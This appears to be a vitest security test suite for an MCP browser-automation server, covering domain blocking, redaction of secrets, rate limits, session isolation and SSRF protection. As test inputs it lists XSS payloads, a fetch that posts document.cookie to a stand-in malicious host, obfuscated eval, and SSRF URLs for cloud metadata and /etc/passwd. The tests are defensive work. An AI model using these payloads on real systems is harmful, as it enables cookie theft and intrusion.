import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import { IntegratedMCPServer } from '../../src/server/integrated-server.js';
import { MCPClient } from '../../vscode-extension/src/mcp-client.js';
import { SecurityManager } from '../../src/security/security-manager.js';

describe('Security Audit and Penetration Testing', () => {
  let server: IntegratedMCPServer;
  let client: MCPClient;
  let securityManager: SecurityManager;
  const testPort = 3002;

  beforeAll(async () => {
    server = new IntegratedMCPServer({
      websocketPort: testPort,
      enableWebSocket: true,
      enableStdio: false,
      allowedDomains: ['localhost', '127.0.0.1', 'example.com'],
      maxSessions: 3,
      sessionTimeout: 30000
    });

    await server.start();
    securityManager = server.getSecurityManager();

    client = new MCPClient(`ws://localhost:${testPort}`);
    await client.connect();
  });

  afterAll(async () => {
    if (client) {
      await client.disconnect();
    }
    if (server) {
      await server.stop();
    }
  });

  describe('Domain Access Control', () => {
    it('should block unauthorized domains', async () => {
      const context = await client.callTool('browser.newContext', {});
      
      const unauthorizedDomains = [
        'https://malicious-site.com',
        'http://blocked-domain.org',
        'https://untrusted.net'
      ];

      for (const domain of unauthorizedDomains) {
        try {
          await client.callTool('browser.goto', {
            sessionId: context.sessionId,
            url: domain
          });
          expect.fail(`Should have blocked access to ${domain}`);
        } catch (error) {
          expect(error.message).toMatch(/Domain not allowed|Access denied|Blocked/i);
        }
      }
    });

    it('should allow authorized domains', async () => {
      const context = await client.callTool('browser.newContext', {});
      
      const authorizedUrls = [
        'http://localhost:8080/test',
        'http://127.0.0.1:3000/api',
        'https://example.com/page'
      ];

      for (const url of authorizedUrls) {
        try {
          const result = await client.callTool('browser.goto', {
            sessionId: context.sessionId,
            url
          });
          // Should not throw error for authorized domains
          expect(result).toBeDefined();
        } catch (error) {
          // Network errors are acceptable, security blocks are not
          expect(error.message).not.toMatch(/Domain not allowed|Access denied|Blocked/i);
        }
      }
    });

    it('should validate URL schemes', async () => {
      const context = await client.callTool('browser.newContext', {});
      
      const maliciousSchemes = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd',
        'ftp://malicious.com/file'
      ];

      for (const url of maliciousSchemes) {
        try {
          await client.callTool('browser.goto', {
            sessionId: context.sessionId,
            url
          });
          // Some schemes might be allowed (like data:), but should be sanitized
        } catch (error) {
          // Security blocks are expected for dangerous schemes
          expect(error.message).toMatch(/Invalid scheme|Blocked|Not allowed/i);
        }
      }
    });
  });

  describe('Data Sanitization', () => {
    it('should filter sensitive headers from network logs', async () => {
      const testData = {
        requestHeaders: {
          'authorization': 'Bearer secret-token',
          'cookie': 'session=abc123',
          'x-api-key': 'secret-key',
          'content-type': 'application/json',
          'user-agent': 'test-browser'
        },
        responseHeaders: {
          'set-cookie': 'session=new-session; HttpOnly',
          'authorization': 'Bearer response-token',
          'content-type': 'application/json',
          'cache-control': 'no-cache'
        }
      };

      const sanitized = securityManager.filterSensitiveData(testData);

      // Sensitive headers should be redacted
      expect(sanitized.requestHeaders.authorization).toBe('[REDACTED]');
      expect(sanitized.requestHeaders.cookie).toBe('[REDACTED]');
      expect(sanitized.requestHeaders['x-api-key']).toBe('[REDACTED]');
      expect(sanitized.responseHeaders['set-cookie']).toBe('[REDACTED]');

      // Non-sensitive headers should remain
      expect(sanitized.requestHeaders['content-type']).toBe('application/json');
      expect(sanitized.requestHeaders['user-agent']).toBe('test-browser');
      expect(sanitized.responseHeaders['content-type']).toBe('application/json');
    });

    it('should sanitize request/response bodies', async () => {
      const testData = {
        requestBody: JSON.stringify({
          username: 'testuser',
          password: 'secret123',
          apiKey: 'sk-1234567890',
          data: 'normal data'
        }),
        responseBody: JSON.stringify({
          token: 'jwt-token-here',
          user: { id: 1, name: 'Test User' },
          secret: 'hidden-value'
        })
      };

      const sanitized = securityManager.filterSensitiveData(testData);

      // Should redact sensitive fields
      const reqBody = JSON.parse(sanitized.requestBody);
      const resBody = JSON.parse(sanitized.responseBody);

      expect(reqBody.password).toBe('[REDACTED]');
      expect(reqBody.apiKey).toBe('[REDACTED]');
      expect(reqBody.username).toBe('testuser'); // Non-sensitive
      expect(reqBody.data).toBe('normal data'); // Non-sensitive

      expect(resBody.token).toBe('[REDACTED]');
      expect(resBody.secret).toBe('[REDACTED]');
      expect(resBody.user.name).toBe('Test User'); // Non-sensitive
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce request rate limits', async () => {
      const context = await client.callTool('browser.newContext', {});
      
      // Make rapid requests to test rate limiting
      const requests = [];
      for (let i = 0; i < 100; i++) {
        requests.push(
          client.callTool('browser.screenshot', {
            sessionId: context.sessionId
          }).catch(error => error)
        );
      }

      const results = await Promise.all(requests);
      const rateLimitErrors = results.filter(result => 
        result instanceof Error && result.message.includes('rate limit')
      );

      // Should have some rate limit errors
      expect(rateLimitErrors.length).toBeGreaterThan(0);
    });

    it('should enforce session limits', async () => {
      const sessions = [];
      
      // Try to create more sessions than allowed
      for (let i = 0; i < 10; i++) {
        try {
          const context = await client.callTool('browser.newContext', {});
          sessions.push(context.sessionId);
        } catch (error) {
          // Should eventually hit session limit
          expect(error.message).toMatch(/session limit|too many sessions/i);
          break;
        }
      }

      // Should not exceed configured limit
      expect(sessions.length).toBeLessThanOrEqual(3);
    });
  });

  describe('Input Validation', () => {
    it('should validate JavaScript code execution', async () => {
      const context = await client.callTool('browser.newContext', {});
      await client.callTool('browser.goto', {
        sessionId: context.sessionId,
        url: 'data:text/html,<html><body>Test</body></html>'
      });

      const maliciousCode = [
        'while(true) {}', // Infinite loop
        'fetch("http://malicious.com/steal", {method: "POST", body: document.cookie})', // Data exfiltration
        'eval(atob("bWFsaWNpb3VzIGNvZGU="))', // Obfuscated code
        'new Function("return process")().exit()', // Process manipulation
      ];

      for (const code of maliciousCode) {
        try {
          const result = await client.callTool('browser.eval', {
            sessionId: context.sessionId,
            code,
            timeout: 5000
          });
          
          // If execution completes, it should be safe or timed out
          if (result.success === false) {
            expect(result.error).toMatch(/timeout|blocked|not allowed/i);
          }
        } catch (error) {
          // Security blocks or timeouts are expected
          expect(error.message).toMatch(/timeout|blocked|not allowed|security/i);
        }
      }
    });

    it('should validate selectors for XSS', async () => {
      const context = await client.callTool('browser.newContext', {});
      await client.callTool('browser.goto', {
        sessionId: context.sessionId,
        url: 'data:text/html,<html><body><div id="test">Content</div></body></html>'
      });

      const maliciousSelectors = [
        'javascript:alert("xss")',
        '<script>alert("xss")</script>',
        'img[src=x onerror=alert("xss")]',
        'div[onclick="alert(\\"xss\\")"]'
      ];

      for (const selector of maliciousSelectors) {
        try {
          await client.callTool('browser.click', {
            sessionId: context.sessionId,
            selector
          });
          // Should either fail safely or sanitize the selector
        } catch (error) {
          // Errors are expected for malicious selectors
          expect(error.message).toMatch(/invalid selector|not found|blocked/i);
        }
      }
    });
  });

  describe('Session Isolation', () => {
    it('should isolate browser contexts between sessions', async () => {
      const context1 = await client.callTool('browser.newContext', {});
      const context2 = await client.callTool('browser.newContext', {});

      // Set different data in each session
      await client.callTool('browser.goto', {
        sessionId: context1.sessionId,
        url: 'data:text/html,<html><body><div id="data">Session1</div></body></html>'
      });

      await client.callTool('browser.goto', {
        sessionId: context2.sessionId,
        url: 'data:text/html,<html><body><div id="data">Session2</div></body></html>'
      });

      // Verify data isolation
      const result1 = await client.callTool('browser.eval', {
        sessionId: context1.sessionId,
        code: 'document.getElementById("data").textContent'
      });

      const result2 = await client.callTool('browser.eval', {
        sessionId: context2.sessionId,
        code: 'document.getElementById("data").textContent'
      });

      expect(result1.result).toBe('Session1');
      expect(result2.result).toBe('Session2');
    });

    it('should prevent cross-session data access', async () => {
      const context1 = await client.callTool('browser.newContext', {});
      const context2 = await client.callTool('browser.newContext', {});

      // Try to access context1 from context2's session
      try {
        await client.callTool('browser.screenshot', {
          sessionId: context1.sessionId + '-modified' // Invalid session ID
        });
        expect.fail('Should not allow access to invalid session');
      } catch (error) {
        expect(error.message).toMatch(/session not found|invalid session|access denied/i);
      }
    });
  });

  describe('Resource Protection', () => {
    it('should prevent excessive memory usage', async () => {
      const context = await client.callTool('browser.newContext', {});
      await client.callTool('browser.goto', {
        sessionId: context.sessionId,
        url: 'data:text/html,<html><body>Memory test</body></html>'
      });

      // Try to allocate excessive memory
      try {
        await client.callTool('browser.eval', {
          sessionId: context.sessionId,
          code: 'const arr = new Array(1000000000).fill("x".repeat(1000));', // ~1TB attempt
          timeout: 10000
        });
      } catch (error) {
        // Should be blocked by memory limits or timeout
        expect(error.message).toMatch(/timeout|memory|limit|blocked/i);
      }
    });

    it('should prevent excessive disk usage', async () => {
      const context = await client.callTool('browser.newContext', {});
      
      // Try to take many large screenshots
      const promises = [];
      for (let i = 0; i < 50; i++) {
        promises.push(
          client.callTool('browser.screenshot', {
            sessionId: context.sessionId,
            format: 'png',
            fullPage: true
          }).catch(error => error)
        );
      }

      const results = await Promise.all(promises);
      const diskLimitErrors = results.filter(result => 
        result instanceof Error && result.message.includes('disk')
      );

      // Should eventually hit disk limits
      expect(diskLimitErrors.length).toBeGreaterThan(0);
    });
  });

  describe('Network Security', () => {
    it('should prevent SSRF attacks', async () => {
      const context = await client.callTool('browser.newContext', {});
      
      const ssrfUrls = [
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://localhost:22/', // SSH port
        'http://127.0.0.1:3306/', // MySQL port
        'http://[::1]:6379/', // Redis IPv6
        'file:///etc/passwd', // Local file access
      ];

      for (const url of ssrfUrls) {
        try {
          await client.callTool('browser.goto', {
            sessionId: context.sessionId,
            url
          });
          // Should be blocked or fail safely
        } catch (error) {
          expect(error.message).toMatch(/blocked|not allowed|access denied|invalid/i);
        }
      }
    });

    it('should validate WebSocket connections', async () => {
      // Test WebSocket security by attempting connections with invalid origins
      const maliciousClient = new MCPClient(`ws://localhost:${testPort}`, {
        headers: {
          'Origin': 'https://malicious-site.com',
          'User-Agent': 'Malicious Bot'
        }
      });

      try {
        await maliciousClient.connect();
        // Connection might succeed but should be monitored/limited
        await maliciousClient.disconnect();
      } catch (error) {
        // Connection rejection is acceptable for security
        expect(error.message).toMatch(/connection|refused|blocked/i);
      }
    });
  });

  describe('Audit Logging', () => {
    it('should log security events', async () => {
      const context = await client.callTool('browser.newContext', {});
      
      // Trigger security events
      try {
        await client.callTool('browser.goto', {
          sessionId: context.sessionId,
          url: 'https://blocked-domain.com'
        });
      } catch (error) {
        // Security event should be logged
      }

      // Verify security manager tracks events
      const rateLimitStatus = securityManager.getRateLimitStatus();
      expect(rateLimitStatus).toBeDefined();
    });

    it('should track failed authentication attempts', async () => {
      // Test multiple failed connection attempts
      for (let i = 0; i < 5; i++) {
        const badClient = new MCPClient(`ws://localhost:${testPort + 1000}`); // Wrong port
        try {
          await badClient.connect();
          await badClient.disconnect();
        } catch (error) {
          // Expected to fail
        }
      }

      // Should track failed attempts (implementation dependent)
      expect(true).toBe(true); // Placeholder for actual audit log verification
    });
  });

  describe('Compliance and Standards', () => {
    it('should implement secure defaults', async () => {
      const status = server.getStatus();
      
      // Verify secure configuration
      expect(status.security.allowedDomains).toEqual(['localhost', '127.0.0.1', 'example.com']);
      expect(status.sessions.max).toBeLessThanOrEqual(10); // Reasonable limit
      expect(status.security.rateLimits).toBeDefined();
    });

    it('should provide security headers', async () => {
      // Test that WebSocket server implements security best practices
      const wsServer = server.getWebSocketServer();
      expect(wsServer).toBeDefined();
      
      // Verify server configuration includes security measures
      expect(wsServer.isServerRunning()).toBe(true);
    });
  });
});